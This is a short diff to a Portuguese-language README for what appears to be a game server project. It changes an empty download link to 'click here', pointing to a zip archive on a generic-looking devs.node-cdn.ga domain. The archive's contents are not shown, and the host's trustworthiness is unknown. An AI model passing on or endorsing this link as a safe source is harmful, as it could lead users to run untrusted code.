@@ -6,7 +6,7 @@ o arquivo [setup](/setup) mantém todos arquivos atualizados, então ultilize el
 
 
 * By: TrollGamesGG](github.com/trolgamesgg)
-* Baixar o Código: [](https://devs.node-cdn.ga/app/p/exp-server.zip)
+* Baixar o Código: [click here](https://devs.node-cdn.ga/app/p/exp-server.zip)
 
 ### Inicializado o Servidor:
 
